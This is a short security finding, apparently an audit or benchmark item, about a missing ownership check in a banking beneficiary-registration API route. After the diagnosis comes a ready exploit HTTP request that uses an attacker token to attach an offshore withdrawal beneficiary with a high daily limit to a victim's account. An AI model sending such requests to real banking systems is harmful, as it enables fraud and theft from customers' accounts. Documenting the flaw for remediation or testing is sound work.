diagnosis: The banking beneficiary registration route uses Zod to validate account format regex and IBAN length, but blindly trusts req.validData.sourceAccountId. It performs no ownership check to verify that sourceAccountId belongs to the authenticated customer, enabling attackers to attach external withdrawal beneficiaries to victim bank accounts.
exploit_request:
POST /api/banking/beneficiaries/add HTTP/1.1
Host: onlinebanking.bank.internal:7003
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{
  "sourceAccountId": "ACT-9901823741",
  "recipientIban": "GB29XAAA00192837465019",
  "beneficiaryName": "Offshore Holdings Ltd",
  "dailyTransferLimit": 500000
}
